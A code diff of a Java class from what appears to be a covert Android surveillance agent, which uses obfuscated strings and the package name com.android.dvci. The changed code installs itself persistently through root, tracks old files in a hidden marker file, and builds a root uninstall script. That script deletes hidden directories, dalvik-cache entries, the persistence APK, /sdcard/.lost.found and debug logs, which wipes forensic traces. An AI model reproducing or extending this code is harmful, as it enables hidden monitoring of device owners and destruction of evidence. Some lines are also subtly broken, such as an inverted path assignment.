@@ -20,7 +20,6 @@ import com.android.mm.M;
 
 import java.io.BufferedInputStream;
 import java.io.BufferedOutputStream;
-import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
@@ -34,6 +33,7 @@ import java.io.Serializable;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
+import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Date;
 import java.util.Properties;
@@ -54,7 +54,7 @@ public class Root {
 	private final static String SU = M.e("su");
 	private Markup markupOldApk;
 	static Semaphore semGetPermission = new Semaphore(1);
-	private static final String DEL_OLD_APK_MARKUP = ".ap";
+	private static final String DEL_OLD_FILE_MARKUP = ".ap";
 
 	static public boolean isNotificationNeeded() {
 		if (Cfg.OSVERSION.equals("v2") == false) {
@@ -226,7 +226,7 @@ public class Root {
 			Check.log(TAG + " (adjustOom): OOM Adjusted"); //$NON-NLS-1$
 		}
 	}
-	public static Boolean saveStringToSerFile(AutoFile f,String s){
+	public static Boolean saveSerToFile(AutoFile f,Serializable s){
 		try {
 			OutputStream file = new FileOutputStream(f.getFile());
 			OutputStream buffer = new BufferedOutputStream(file);
@@ -242,14 +242,14 @@ public class Root {
 		return false;
 	}
 
-	public static String getStringFromSerFile(AutoFile f){
-		String res=null;
+	public static Serializable getSerFromFile(AutoFile f){
+		Serializable res=null;
 		try{
 			InputStream file = new FileInputStream(f.getFile());
 			InputStream buffer = new BufferedInputStream(file);
 			ObjectInput input = new ObjectInputStream(buffer);
 			//deserialize the List
-			res = (String)input.readObject();
+			res = (Serializable) input.readObject();
 		}
 		catch(ClassNotFoundException ex){
 			if (Cfg.DEBUG) {
@@ -264,23 +264,38 @@ public class Root {
 		return res;
 	}
 
-	private static void createdelOldApkMarkup(String s) {
+	private static void addOldFileMarkup(String s) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (createdelOldApkMarkup) ");
+			Check.log(TAG + " (addOldFileMarkup) ");
 		}
-		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), DEL_OLD_APK_MARKUP);
-		saveStringToSerFile(markup,s);
+		ArrayList<String> al = null;
+		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), DEL_OLD_FILE_MARKUP);
+		if ( (al=haveOldFileMarkup())==null) {
+			al = new ArrayList<String>();
+		}
+		al.add(s);
+		saveSerToFile(markup, al);
 	}
 
-	private String haveOldApkMarkup() {
-		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), DEL_OLD_APK_MARKUP);
+	private static ArrayList<String> haveOldFileMarkup() {
+		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), DEL_OLD_FILE_MARKUP);
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (OldApkMarkup) "+ markup.exists());
+			Check.log(TAG + " (haveOldFileMarkup) "+ markup.exists());
 		}
 		if(markup.exists()) {
-			return getStringFromSerFile(markup);
+			return (ArrayList<String>) getSerFromFile(markup);
 		}
 		return null;
+	}
+
+	private static void delOldFileMarkup() {
+		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), DEL_OLD_FILE_MARKUP);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (haveOldFileMarkup) "+ markup.exists());
+		}
+		if (markup.exists()) {
+			markup.delete();
+		}
 	}
 
 	static public boolean uninstallRoot() {
@@ -294,37 +309,54 @@ public class Root {
 
 		String packageName = Status.self().getAppContext().getPackageName();
 		String apkName = Status.getApkName();
-		Boolean isPersisten = Status.isPersistent();
 		if (apkName != null ) {
 
 			Status.setIconState(false);
 			String script = M.e("#!/system/bin/sh") + "\n";
+			script+= M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib")+ "\n";
 			//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
 			if (new AutoFile(Path.hidden()).exists()) {
-				script += M.e("rm -r ") + Path.hidden() + "\n";
+				script+= M.e("rm -r ") + Path.hidden() + "\n";
 			}
-			script += Configuration.shellFile + M.e(" blw") + "\n";
-			if (isPersisten) {
+			script+= Configuration.shellFile + M.e(" blw") + "\n";
 			/* we need to remove also /data/data/pkgName ? */
-				if (Status.getAppDir() != null) {
-					if (new AutoFile(Status.getAppDir()).exists()) {
-						script += M.e("rm -r ") + Status.getAppDir() + "\n";
-					}
+			if (Status.getAppDir() != null) {
+				if (new AutoFile(Status.getAppDir()).exists()) {
+					script+= M.e("rm -r ") + Status.getAppDir() + "\n";
 				}
-				script += M.e("for i in `ls /data/dalvik-cache/*com.android.dvci*`; do rm  $i; done") + "\n" ;
-			}else{
-				script += M.e("for i in `ls /data/dalvik-cache/*StkDevice*`; do rm  $i; done") + "\n" ;
 			}
-			script += M.e("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm clear ") + packageName + "\n";
-			script += M.e("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall ") + packageName + "\n";
-			script += M.e("sleep 1; rm ") + apkName + "\n";
+			script+= M.e("for i in `ls /data/dalvik-cache/*com.android.dvci* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n" ;
+			script+= M.e("for i in `ls /data/dalvik-cache/*StkDevice* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n" ;
 
-			script += Configuration.shellFile + M.e(" blr") + "\n";
-			script += Configuration.shellFile + M.e(" ru") + "\n";
 
+			script += M.e("pm clear ") + packageName + "\n";
+			script += M.e("pm disable ") + packageName + "\n";
+			script += M.e("pm uninstall ") + packageName + "\n";
+			script += M.e("pm enable ") + packageName + "\n";
+				/* todo: do it manually? without pm intervention
+				 * 1) edit /data/system/packages.xml
+				 * 2) edit /data/system/packages.list
+				 * 3) /data/system/packages-stopped.xml does it really exist
+				 * 4) add at the end of the scrip /data/app/<apkName>.apk removal
+				 */
+
+
+
+			script+= String.format(M.e(" [ -e %s ] && rm %s"), Status.persistencyApk,Status.persistencyApk) + "\n";
+			script+= String.format(M.e(" [ -e %s ] && rm -r %s"), M.e("/sdcard/.lost.found"),M.e("/sdcard/.lost.found")) + "\n";
+
+			script+= Configuration.shellFile + M.e(" blr") + "\n";
+			script+= Configuration.shellFile + M.e(" ru") + "\n";
+			script+= M.e("sleep 1; ") + String.format(M.e(" [ -e %s ] && rm %s"), apkName,apkName) + "\n";
+			ArrayList<String> fl=null;
+			if(( fl=haveOldFileMarkup())!=null && !fl.isEmpty()){
+				for(String s:fl){
+					script+= String.format(M.e("for i in `ls  %s 2>/dev/null`; do [ -e $i ] && rm $i; done"), s) + "\n";
+				}
+			}
 			if (Cfg.DEBUG) {
 				if (new AutoFile(M.e("rm /data/local/tmp/log")).exists()) {
-					script += M.e("rm /data/local/tmp/log") + "\n";
+					script+= M.e("rm /data/local/tmp/log") + "\n";
 				}
 			}
 
@@ -335,6 +367,8 @@ public class Root {
 				}
 				return false;
 			}
+
+
 			Execute ex = new Execute();
 			ExecuteResult result = ex.executeRoot(Status.getAppContext().getFilesDir() + "/" + filename);
 			if (Cfg.DEBUG) {
@@ -372,20 +406,30 @@ public class Root {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (installPersistence): already persistent!! " );
 			}
-			String s=null;
-			if(isPersisten && (s=ha)!=null){
-				ExecuteResult pers = Execute.executeRoot(String.format(M.e("rm /%s*"),s) + "\n");
-				Status.setApkName(perPkg);
-				return true;
+			ArrayList<String> fl=null;
+			if(isPersisten && (fl=haveOldFileMarkup())!=null && !fl.isEmpty()){
+				String command = M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib")+ "\n";
+				for(String s:fl){
+					command+= String.format(M.e("for i in `ls  %s`; do [ -e $i ] && rm $i; done"), s) + "\n";
+				}
+				ExecuteResult pers = Execute.executeRoot(command);
+				String persString = pers.getStdout();
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (installPersistence) rm old file:\n" + pers.getStdout());
+				}
 			}
-			command+=
-
+			if (Status.needReboot()) {
+				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_PRESENT_TOREBOOT);
+			}else{
+				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_PRESENT);
+			}
 			return true;
 		}
 
 
 		Execute.execute(new String[]{Configuration.shellFileBase, "blw"});
-		createdelOldApkMarkup(String.format(M.e("rm /%s*"), apkPosition.split("-")[0]));
+		addOldFileMarkup(String.format(M.e("%s*"), apkPosition.split("-")[0]));
+
 
 		String perPkg = Status.persistencyApk;
 		String command = M.e("export LD_LIBRARY_PATH=/vendor/lib:/system/lib")+ "\n";
@@ -415,10 +459,14 @@ public class Root {
 		}
 
 		if(persString.contains(perPkg)){
-			Status.setApkName(perPkg);
+			if (Status.needReboot()) {
+				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_PRESENT_TOREBOOT);
+			}else{
+				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_PRESENT);
+			}
 			return true;
 		}
-
+		Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_FAILED);
 		return false;
 	}
 
@@ -829,6 +877,11 @@ public class Root {
 	// name WITHOUT path (script is generated inside /data/data/<package>/files/
 	// directory)
 	static public boolean createScript(String name, String script) {
+		return createScript(name,script,null);
+	}
+
+	static public boolean createScript(String name, String script,String absolutPaht) {
+		String absP=Status.getAppContext().getFilesDir() + "/" + name;
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (createScript): script: " + script); //$NON-NLS-1$
 		}
@@ -837,8 +890,10 @@ public class Root {
 			FileOutputStream fos = Status.getAppContext().openFileOutput(name, Context.MODE_PRIVATE);
 			fos.write(script.getBytes());
 			fos.close();
-
-			Execute.execute("chmod 755 " + Status.getAppContext().getFilesDir() + "/" + name);
+			if(absolutPaht!=null){
+				absolutPaht=absP;
+			}
+			Execute.execute("chmod 755 " + absP);
 
 			return true;
 		} catch (Exception e) {
